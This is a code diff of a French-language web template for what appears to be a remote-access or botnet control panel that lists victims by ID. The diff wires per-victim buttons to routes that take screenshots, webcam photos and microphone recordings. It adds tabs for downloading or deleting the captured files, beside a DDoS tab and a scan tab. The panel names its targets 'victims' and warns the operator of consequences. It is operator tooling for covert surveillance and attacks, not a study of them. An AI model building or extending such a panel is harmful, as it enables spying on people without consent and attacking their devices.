@@ -21,6 +21,18 @@
                             <button class="nav-link w-100" id="profile-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-profile" type="button" role="tab" aria-controls="profile" aria-selected="false">DDOS</button>
                         </li>
                         <li class="nav-item flex-fill" role="presentation">
+                            <button class="nav-link w-100" id="record-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-record" type="button" role="tab" aria-controls="record" aria-selected="false">Enregistrements</button>
+                        </li>
+                        <li class="nav-item flex-fill" role="presentation">
+                            <button class="nav-link w-100" id="picture-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-picture" type="button" role="tab" aria-controls="picture" aria-selected="false">Photos</button>
+                        </li>
+                        <li class="nav-item flex-fill" role="presentation">
+                            <button class="nav-link w-100" id="screen-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-screen" type="button" role="tab" aria-controls="screen" aria-selected="false">Captures</button>
+                        </li>
+                        <li class="nav-item flex-fill" role="presentation">
+                            <button class="nav-link w-100" id="scan-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-scan" type="button" role="tab" aria-controls="scan" aria-selected="false">Scan</button>
+                        </li>
+                        <li class="nav-item flex-fill" role="presentation">
                             <button class="nav-link w-100" id="contact-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-contact" type="button" role="tab" aria-controls="contact" aria-selected="false">Informations</button>
                         </li>
                     </ul>
@@ -61,19 +73,19 @@
                                             <input type="hidden" name="group_id" value="{{ $group->id }}">
                                             <td><button type="submit" class="btn btn-warning"><i class="bi bi-broadcast"></i></button></td>
                                         </form>
-                                        <form method="POST" action="{{ route('network.scan') }}">
+                                        <form method="POST" action="{{ route('network.screenshot') }}">
                                             @csrf
                                             <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                             <input type="hidden" name="group_id" value="{{ $group->id }}">
                                             <td><button type="submit" class="btn btn-warning"><i class="bi bi-fullscreen"></i></button></td>
                                         </form>
-                                        <form method="POST" action="{{ route('network.scan') }}">
+                                        <form method="POST" action="{{ route('network.picture') }}">
                                             @csrf
                                             <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                             <input type="hidden" name="group_id" value="{{ $group->id }}">
                                             <td><button type="submit" class="btn btn-warning"><i class="bi bi-camera-fill"></i></button></td>
                                         </form>
-                                        <form method="POST" action="{{ route('network.scan') }}">
+                                        <form method="POST" action="{{ route('network.record') }}">
                                             @csrf
                                             <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                             <input type="hidden" name="group_id" value="{{ $group->id }}">
@@ -121,6 +133,107 @@
                                         <br>
                                         Vous êtes responsable des conséquences que cet outil peut avoir sur les victimes.
                                     </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="tab-pane fade" id="bordered-justified-record" role="tabpanel" aria-labelledby="record-tab">
+                            <div class="card">
+                                <div class="card-body">
+                                    <h5 class="card-title">Enregistrements</h5>
+                                    <table class="table">
+                                        <thead>
+                                            <tr>
+                                                <th scope="col">ID</th>
+                                                <th scope="col">Nom</th>
+                                                <th scope="col">Heure</th>
+                                                <th scope="col">Date</th>
+                                                <th scope="col">Actions</th>
+                                            </tr>
+                                            </thead>
+                                            <tbody>
+                                            <tr>
+                                                <th scope="row">1</th>
+                                                <td scope="row">20240625-134556.wav</td>
+                                                <td scope="row">13h45</td>
+                                                <td scope="row">25/06/2024</td>
+                                                <td>
+                                                    <button type="submit" class="btn btn-success">Télécharger</button>
+                                                    <button type="submit" class="btn btn-danger">Supprimer</button>
+                                                </td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="tab-pane fade" id="bordered-justified-picture" role="tabpanel" aria-labelledby="picture-tab">
+                            <div class="card">
+                                <div class="card-body">
+                                    <h5 class="card-title">Photos</h5>
+                                    <table class="table">
+                                        <thead>
+                                            <tr>
+                                                <th scope="col">ID</th>
+                                                <th scope="col">Nom</th>
+                                                <th scope="col">Heure</th>
+                                                <th scope="col">Date</th>
+                                                <th scope="col">Actions</th>
+                                            </tr>
+                                            </thead>
+                                            <tbody>
+                                            <tr>
+                                                <th scope="row">1</th>
+                                                <td scope="row">20240625-134556.jpg</td>
+                                                <td scope="row">13h45</td>
+                                                <td scope="row">25/06/2024</td>
+                                                <td>
+                                                    <button type="submit" class="btn btn-success">Télécharger</button>
+                                                    <button type="submit" class="btn btn-danger">Supprimer</button>
+                                                </td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="tab-pane fade" id="bordered-justified-screen" role="tabpanel" aria-labelledby="screen-tab">
+                            <div class="card">
+                                <div class="card-body">
+                                    <h5 class="card-title">Captures</h5>
+                                    <table class="table">
+                                        <thead>
+                                            <tr>
+                                                <th scope="col">ID</th>
+                                                <th scope="col">Nom</th>
+                                                <th scope="col">Heure</th>
+                                                <th scope="col">Date</th>
+                                                <th scope="col">Actions</th>
+                                            </tr>
+                                            </thead>
+                                            <tbody>
+                                            <tr>
+                                                <th scope="row">1</th>
+                                                <td scope="row">20240625-134556.png</td>
+                                                <td scope="row">13h45</td>
+                                                <td scope="row">25/06/2024</td>
+                                                <td>
+                                                    <button type="submit" class="btn btn-success">Télécharger</button>
+                                                    <button type="submit" class="btn btn-danger">Supprimer</button>
+                                                </td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="tab-pane fade" id="bordered-justified-scan" role="tabpanel" aria-labelledby="scan-tab">
+                            <div class="card">
+                                <div class="card-body">
+                                    <h5 class="card-title">Scan</h5>
                                 </div>
                             </div>
                         </div>
